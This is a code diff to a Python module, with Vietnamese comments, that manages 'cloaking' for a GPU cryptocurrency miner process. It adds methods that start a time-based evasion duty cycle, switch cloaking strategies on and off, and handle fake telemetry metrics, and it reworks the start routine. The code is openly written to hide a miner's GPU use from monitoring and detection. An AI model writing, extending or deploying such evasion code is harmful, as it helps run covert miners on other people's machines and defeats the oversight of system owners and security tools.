@@ -33,14 +33,16 @@ import time
 import logging
 import subprocess
 from pathlib import Path
-from typing import Optional, Dict, Any
+from typing import Optional, Dict, Any, List
 
-# ✅ LAYER 1: Import IGPUPlugin interface
+# ✅ LAYER 1: Import IGPUPlugin and IGPUCloakService interfaces
 try:
-    from ..core.interfaces import IGPUPlugin
+    from ..core.interfaces import IGPUPlugin, IGPUCloakService
 except ImportError:
     # Fallback nếu không có interface
     class IGPUPlugin:
+        pass
+    class IGPUCloakService(IGPUPlugin):
         pass
 
 try:
@@ -85,7 +87,7 @@ logging.basicConfig(
 logger = logging.getLogger('gpu_cloaking_manager')
 
 # ---------- helper class ----------
-class GPUCloakingManager(IGPUPlugin):
+class GPUCloakingManager(IGPUCloakService):
     """Điều phối Time-based Evasion và eBPF Telemetry Filter cho một process GPU miner.
     
     ✅ LAYER 1: Implements IGPUPlugin interface for proper plugin registration.
@@ -347,28 +349,67 @@ class GPUCloakingManager(IGPUPlugin):
         logger.info("🛑 GPUCloakingManager duty cycle dừng.")
 
     # ---------------- public API -----------------
-    def start(self):
-        """Khởi động GPU Cloaking Manager với tất cả các chiến lược."""
-        if self._thread and self._thread.is_alive():
-            logger.warning("GPUCloakingManager đã chạy từ trước.")
+    def start(self) -> bool:
+        """Khởi động GPU Cloaking Manager với tất cả các chiến lược.
+        
+        Returns:
+            bool: True nếu khởi động thành công, False nếu thất bại
+        """
+        try:
+            if self._thread and self._thread.is_alive():
+                logger.warning("GPUCloakingManager đã chạy từ trước.")
+                gpu_cloak_logger.log_time_based_evasion(
+                    action="START",
+                    status="SUCCESS",
+                    target_pid=self.pid,
+                    error_details="Already running"
+                )
+                return True  # ✅ Already running counts as success
+            
+            # ✅ Validate target PID before starting
+            if not self.is_process_alive():
+                logger.error(f"❌ Target PID {self.pid} is not alive - cannot start time_based_manager")
+                gpu_cloak_logger.log_time_based_evasion(
+                    action="START",
+                    status="FAILED",
+                    target_pid=self.pid,
+                    error_details=f"Target PID {self.pid} not alive"
+                )
+                return False
+            
+            logger.info("🚀 Khởi động GPUCloakingManager cho PID %d", self.pid)
             gpu_cloak_logger.log_time_based_evasion(
                 action="START",
                 status="SUCCESS",
-                target_pid=self.pid,
-                error_details="Already running"
+                work_ms=self.work_ms,
+                sleep_ms=self.sleep_ms,
+                target_pid=self.pid
             )
-            return
-        
-        logger.info("🚀 Khởi động GPUCloakingManager cho PID %d", self.pid)
-        gpu_cloak_logger.log_time_based_evasion(
-            action="START",
-            status="SUCCESS",
-            work_ms=self.work_ms,
-            sleep_ms=self.sleep_ms,
-            target_pid=self.pid
-        )
-        self._thread = threading.Thread(target=self._duty_cycle_loop, daemon=True)
-        self._thread.start()
+            
+            # ✅ Start the duty cycle thread
+            self._thread = threading.Thread(target=self._duty_cycle_loop, daemon=True)
+            self._thread.start()
+            
+            # ✅ Brief wait to ensure thread started successfully
+            import time
+            time.sleep(0.1)
+            
+            if self._thread and self._thread.is_alive():
+                logger.info(f"✅ time_based_manager started successfully for PID {self.pid}")
+                return True
+            else:
+                logger.error(f"❌ time_based_manager thread failed to start for PID {self.pid}")
+                return False
+                
+        except Exception as e:
+            logger.error(f"❌ Exception starting time_based_manager for PID {self.pid}: {e}")
+            gpu_cloak_logger.log_time_based_evasion(
+                action="START",
+                status="FAILED",
+                target_pid=self.pid,
+                error_details=str(e)
+            )
+            return False
 
     def stop(self):
         """Dừng tất cả các chiến lược cloaking."""
@@ -408,9 +449,85 @@ class GPUCloakingManager(IGPUPlugin):
         
         return status
     
-    def update_fake_metrics(self, metrics: Dict[str, int]):
-        """eBPF filter đã được loại bỏ - không thể cập nhật metrics."""
+    def update_fake_metrics(self, metrics: Dict[str, int]) -> None:
+        """Cập nhật fake metrics cho các cloaking strategies.
+        
+        Args:
+            metrics: Dictionary chứa các metric và giá trị fake
+        """
         logger.info("ℹ️ eBPF filter has been removed - cannot update metrics")
+        logger.debug(f"Would update fake metrics: {metrics}")
+    
+    def enable_cloaking(self, strategies: List[str]) -> bool:
+        """Kích hoạt các chiến lược cloaking.
+        
+        Args:
+            strategies: Danh sách tên các chiến lược cloaking
+            
+        Returns:
+            bool: True nếu kích hoạt thành công
+        """
+        try:
+            success_count = 0
+            available_strategies = list(self.strategies_status.keys())
+            
+            for strategy in strategies:
+                if strategy in available_strategies:
+                    # Enable strategy based on type
+                    if strategy == 'time_based_evasion':
+                        if not self._thread or not self._thread.is_alive():
+                            success = self.start()
+                            if success:
+                                self.strategies_status[strategy] = True
+                                success_count += 1
+                        else:
+                            self.strategies_status[strategy] = True
+                            success_count += 1
+                    else:
+                        # For other strategies, mark as enabled if conditions are met
+                        self.strategies_status[strategy] = True
+                        success_count += 1
+                    
+                    logger.info(f"✅ Enabled cloaking strategy: {strategy}")
+                else:
+                    logger.warning(f"⚠️ Unknown cloaking strategy: {strategy}")
+            
+            logger.info(f"🎭 Enabled {success_count}/{len(strategies)} cloaking strategies")
+            return success_count > 0
+            
+        except Exception as e:
+            logger.error(f"❌ Failed to enable cloaking strategies: {e}")
+            return False
+    
+    def disable_cloaking(self) -> bool:
+        """Tắt tất cả chiến lược cloaking.
+        
+        Returns:
+            bool: True nếu tắt thành công
+        """
+        try:
+            # Stop time-based evasion
+            if self._thread and self._thread.is_alive():
+                self.stop()
+            
+            # Mark all strategies as disabled
+            for strategy in self.strategies_status:
+                self.strategies_status[strategy] = False
+            
+            logger.info("🛑 All cloaking strategies disabled")
+            return True
+            
+        except Exception as e:
+            logger.error(f"❌ Failed to disable cloaking: {e}")
+            return False
+    
+    def get_active_strategies(self) -> List[str]:
+        """Lấy danh sách các chiến lược đang active.
+        
+        Returns:
+            List[str]: Danh sách tên chiến lược active
+        """
+        return [strategy for strategy, active in self.strategies_status.items() if active]
     
     def is_process_alive(self) -> bool:
         """Kiểm tra xem target process còn sống không."""
